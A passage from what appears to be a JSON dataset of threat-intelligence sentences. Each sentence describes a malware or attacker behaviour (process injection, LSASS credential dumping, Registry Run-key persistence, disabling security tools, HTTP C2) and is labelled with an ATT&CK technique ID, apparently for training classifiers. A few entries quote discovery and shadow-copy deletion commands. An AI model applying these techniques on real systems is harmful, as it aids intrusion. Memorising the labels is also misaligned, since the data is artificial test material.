    "text": "High Commissioner of Bangladesh Pakistan eying Sukhoi-35 fighter planes as part of defense deal from Russia 2018.143 PG COURSE IN 2018-2021 BATCH India Bangladesh and Pakistan Press Release on Observance of Historic Mujibnogor Dibosh by Pakistan Mission on 17 April 2018 Afghan Bomb Blast report by ISI USAJOBS Daily Saved Search Results for New GS15 for 3/30/2018 How Rigging take place in Senate Elections in Pakistan Afghan Terrorist group details ISI Restricted113 1971 Liberation War Freedom Fighters in Pakistan Army Custody Database  Additionally, the following filenames were witnessed in these attacks (spelling and grammar mistakes included):  Liberation Freedom Fighter.xlam NSC details of participants.xlam Raw Sect Vikram report on Pak Army Confidential.doc USA Immagration Policy for Families.ppam doc CV FM.doc doc Sukhoi35 deal report.doc Nominal Roll.doc Press Release 17 April.doc Afghan Blast report by ISI.doc Rigging in Pakistan Senate.doc Afghan Terrorist group report.doc  The payloads for these attacks varied in malware family",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can uninstall or disable security products.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has a command to enumerate running processes and identify their owners.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "it starts payload execution using the ZwCreateThreadEx API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for C2 communications.(Citation: DigiTrust Agent Tesla Jan 2017)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can register a Windows service named CsPower as part of its execution chain and a Windows service named clr_optimization_v2.0.51527_X86 to achieve persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can communicate using HTTP over IPv4 or IPv6 depending on a flag set.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "the actor executes Cobalt Strike’s built-in Mimikatz to dump its credentials or password hash",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "New-UserPersistenceOption Persistence argument can be used to establish via the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.(Citation: GitHub PowerSploit May 2012)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "to establishing a RDP session, including the ability to navigate using a graphical environment and easily move laterally once the necessary access has been granted",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The loader component is executed via RUNDLL32.EXE",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can use GET requests to download additional payloads from C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "used HTTP and HTTPS to send data back to its C2 server.(Citation: Malwarebytes Higaisa 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can use `wmic` to gather information from a system.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "content in a batch script:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "A  file stealer can run a TaskScheduler DLL to add persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Unpacks the code in memory via process hollowing",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used Remote Desktop Services on targeted systems.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can use `GetlogicalDrives` to get a bitmask of all drives available on a compromised system. It can also use `GetDriveType` to determine if a new drive is a CD-ROM drive.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "After downloading its main config file  downloads multiple payloads from C2 servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the CPUID and BIOS version on a compromised system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "registers itself under a Registry Run key with the name USB Disk Security.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "WMI classes are the primary structure within WMI",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Note that the username could be a small joke on the attackers’ part regarding the attribution to FIN7",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "After running within the %TEMP% path, Comnie will delete the original file",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the computer name OS version and hardware configuration on a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "This script called a combination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to collect the username on the infected host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "`amsiPatch.py` module can disable Antimalware Scan Interface (AMSI) functions.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "searches for variety of user files by file extension before encrypting them using RSA and AES including Office PDF image audio video source code archive/compression format and key and certificate files.(Citation: LogRhythm WannaCry)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can use cmd.exe to launch itself and to execute multiple C2 commands.(Citation: Crowdstrike Qakbot October 2020)(Citation: ATT QakBot April 2021)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "injects its communication module into an Internet accessible process through which it performs C2.(Citation: ESET Gazer Aug 2017)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has extracted files from compromised networks. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "lists the running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The RunAtLoad key will command launchd to run the daemon when the operating system starts up, while the KeepAlive key will command launchd to let the process run indefinitely",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "If running in a Windows environment  saves a DLL to disk that is injected into the explorer.exe process to execute the payload.  can also be configured to inject and execute within specific processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "using the MoveFileExW() API function,",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "gathers information on victims drives and has a plugin for document listing.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can place malicious executables in a victim's AutoRun registry key or StartUp directory depending on the AV product installed to maintain persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "use of the .NET framework APIs",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used compromised domain administrator credentials as part of their lateral movement. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has a command to hide itself through injecting into another process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "actors used the following commands after exploiting a machine with  malware to obtain information about files and directories: dir c:\\ >> %temp%\\download dir c:\\Documents and Settings >> %temp%\\download dir c:\\Program Files\\ >> %temp%\\download dir d:\\ >> %temp%\\download",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list drives and files on the compromised host.(Citation: TrendMicro BlackTech June 2017)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can search for specific processes to terminate.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI to gather AV products installed on an infected host.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "establishes persistence by creating a shortcut in the Start Menu folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "obtains a list of running processes on the victim.(Citation: ESET Sednit Part 1)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "performing remote directory listings.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can gather the device serial number and has checked to ensure there is enough disk space using the Unix utility `df`.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can acquire network configuration information like DNS servers public IP and network proxies used by a host.(Citation: Github PowerShell Empire)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has discovered the local network configuration with ipconfig.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "a PowerShell script block was executed\nto download",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to modify the Registry to add its binaries to the Windows Defender exclusion list.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "downloaded and run by the plaintext PY files from external infrastructure.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "utilizes wmic to delete shadow copies.(Citation: LogRhythm WannaCry)(Citation: FireEye WannaCry 2017)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "A  2 plug-in uses WMI to gather victim host details.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Examining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with this IP that mimic popular technology companies",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "extracts basic information about the operating system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "use this technique to retrieve export functions from loaded libraries",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "is capable of installing itself as a service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "A version of  has dropped a Windows shortcut into the Startup folder to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used a DLL named `D8B3.dll` that was injected into the Winlogon process. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can download additional payloads onto the victim.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Creating the HKCU\\Software\\Zeppelin registry key",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, the threat actor was observed attempting to dump the Local Security Authority Subsystem Service (LSASS) process",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "For example, at the end of 2016 CTU researchers observed the threat actors using native system functionality to disable logging processes and delete logs within a network",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can detect the infected machine's network topology using ipconfig and arp.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "malware can collect a list of running processes on a system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve and execute additional  payloads from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTPS for C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the victim user name.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "executed using remote WMI commands",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "This code checks if the disk size is greater than a specified threshold (50 GB as example).",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "It should be noted that the Win32/KillDisk.NBB variant used against media companies is more focused on destroying various types of files and documents",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list drives on the infected host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can open a command line to execute commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can use a scheduled task for installation.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The WMI component of the POSHSPY backdoor leverages a Filter to\nexecute the PowerShell component of the backdoor on a regular basis.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used WMIC.exe for lateral movement.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "to locate certain files, paths,",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has added Registry Run keys to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used a tool to run `cmd /c wmic computersystem get domain` for discovery.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "stores files and logs in a folder on the local drive.(Citation: ESET Machete July 2019)",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute additional files.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: Symantec Shuckworm January 2022)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "may collect information about running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to lure victims into clicking on malicious embedded archive files sent via spearphishing campaigns.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "gathered the operating system name and specific Windows version of an infected machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "uses a Port 22 malware variant to modify several Registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can install as a Windows service for persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can obtain a list of all files and directories as well as logical drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "is capable of executing commands via cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses a command-line interface.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has a module to create delete or modify Registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "uses Run keys for persistence of its loader",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used a reconnaissance module to gather information about the operating system and hardware on the infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has deleted scripts after execution. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can download its second stage from a hardcoded URL within the loader's code.(Citation: IBM Grandoreiro April 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Creates a scheduled task to be executed with d as an argument",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "operators open up an Remote Desktop Protocol (RDP) port",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can gain persistence through use of scheduled tasks.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can open an interactive command-shell to perform command line functions on victim machines.  performs most of its operations using Windows Script Host (Jscript) and to run arbitrary shellcode.(Citation: Github Koadic)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "leverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "uses cmd.exe to execute scripts and commands on the victims machine.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Reaver continues to collect various information from the victim machine, including the following:  Computer name Volume serial number Microsoft Windows version CPU speed ANSI code page OEM code page identifier for the operating system Physical and virtual memory information  Reaver encrypts this data using an incremental XOR key and uploads it to the configured remote server on the port specified",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "dumping their LSASS process",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can use process hollowing to execute its main payload.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "gathers the victims IP address via the ipconfig -all command.(Citation: Lazarus RATANKBA)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "LANS Deletes the file created by the LAN command to reverse the effect",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has searched for the Activity Monitor process in the System Events process list and kills the process if running.  also searches the operating system's `install.log` for apps matching its hardcoded list killing all matching process names.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute a payload onto a compromised system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can report the file system type and disk space of a compromised host to C2.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "a remote service was created with random alphanumeric characters, service name and service file name",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor started their first lateral movement using RDP",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate running processes on a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can run in memory and register its payload as a Windows service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "may query the Registry by running reg query on a victim.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use HTTP in communications with C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has enumerated hosts via  gathering various local system information.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "checks its parent process for indications that it is running in a sandbox setup.(Citation: FinFisher Citation)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can change browser security settings to enable extensions to be installed.  uses the pkill cfprefsd command to prevent users from inspecting processes.(Citation: MacKeeper Bundlore Apr 2019)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has used several Win32 API functions to interact with the victim machine.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has a tool that creates a new service for persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "By running SSH on the server in a compromised network, attackers can come back to the network whenever they want",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "downloads and uploads files on the victims machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can inject decrypted shellcode into the LanmanServer service.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can delete files and artifacts it creates.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "may use WMI when collecting information about a victim.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can use `rundll32` for execution of its components.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "To obtain a job, the Trojan builds a subdomain that has the following structure and issues a DNS query to the C2 server: c<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c The generated subdomain is then subjected to a number-to-character substitution function that is the inverse of the Table 4, which effectively converts all the digits in the subdomain into characters",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "will delete their tools and files and kill processes after their objectives are reached.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used phishing lure documents that trick users into opening them and infecting their computers.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "was seen using MimikatzLite to perform credential dumping.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors relied on a victim to open a PDF document and click on an embedded malicious link to download malware. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "is used to schedule tasks on a Windows system to run at a specific date and time.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "searches the system for all of the following file extensions: .avi .mov .mkv .mpeg .mpeg4 .mp4 .mp3 .wav .ogg .jpeg .jpg .png .bmp .gif .tiff .ico .xlsx and .zip. It can also obtain browsing history cookies and plug-in information.(Citation: S2 Grupo TrickBot June 2017)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to gather the hostname of the victim machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to collect recent files matching a hardcoded list of extensions prior to exfiltration.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "was used to kill endpoint security processes.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can obtain a list of users from an infected machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "threat actors obtain initial access to networks is through the use of compromised valid credential pairs",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has prompted victims to accept macros in order to execute the subsequent payload.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "These files are all self-deleted after launch",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used Windows APIs including `ExitWindowsEx` and `GetKeyboardType`. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "contains a command to list processes.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020) ",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "checks if a value exists within a Registry key in the HKCU hive whose name is the same as the scheduled task it has created.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "contains multiple modules for injecting into processes such as Invoke-PSInject.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "deletes them from the original location.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "obtains victim Microsoft Windows version information and CPU architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has modified Registry settings for default file associations to enable all macros and for persistence.(Citation: CISA AA20-301A Kimsuky)(Citation: Crowdstrike GTR2020 Mar 2020)(Citation: Talos Kimsuky Nov 2021)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can collect data on a compromised host.(Citation: Malwarebytes Kimsuky June 2021)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can search files on a victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The function GetTempPathW is used",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "using Mimikatz and dumping lsass,",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "gathers and beacons the MAC and IP addresses during installation.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used tools to download malicious files to compromised hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used the NtQueueApcThread syscall to inject code into svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can send files from the victim machine to C2.(Citation: PWC WellMess July 2020)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Command ID 17 indexes to a function that collects the system information and sends it to the C2 server.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Commands executed by WMI on new hosts",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence by using S4U tasks as well as the Scheduled Task option in PowerShell Empire.(Citation: FireEye FIN10 June 2017)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP for C2 communications.(Citation: Unit 42 OopsIE! Feb 2018)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory then compressed encrypted and uploaded to a C2 server.(Citation: Novetta Blockbuster)",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "performed via the following command-line syntax",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "command execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "A  payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "plainpwd tool is a modified version of  and dumps Windows credentials from system memory.(Citation: ESET Telebots Dec 2016)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "then recursively searches through all local temp folders.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "rundll32.exe binary downloaded approximately 0.4 MB of data.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded and executed additional encoded payloads.(Citation: ZScaler Squirrelwaffle Sep 2021)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can delete files off the system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to lure victims into enabling malicious macros within email attachments.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use HTTP in C2 communications.(Citation: ClearSky Siamesekitten August 2021)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve additional malicious payloads from its C2 server.(Citation: Talos ROKRAT)(Citation: NCCGroup RokRat Nov 2018)(Citation: Volexity InkySquid RokRAT August 2021)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "they are instructed to click “Confirm” to view a message from “Express.”",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "before running the \".cmd\" file contained within the ISO.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "ListUsers",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded files to a victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use HTTP for C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "the batch file in Figure 7, which Sandals creates on remote systems to launch",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "leveraged Sysmon to understand the processes services in the organization.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has a module to list the processes running on a machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "gathers computer names OS version info and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Table 4: URL parameters Additionally, the command string is hashed using the same RGPH hashing algorithm as before",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can issue commands via HTTP POST.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to determine if the compromised host is running a 32 or 64 bit OS architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "It is created as a separate process instead of child process of Office applications",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has leveraged rundll32.exe to execute malicious DLLs.(Citation: Cybereason TA505 April 2019)",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "can search files on the target host by extension including doc docx xls rtf odt txt jpg pdf rar zip and 7z. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "stores collected data in local SQLite databases prior to exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
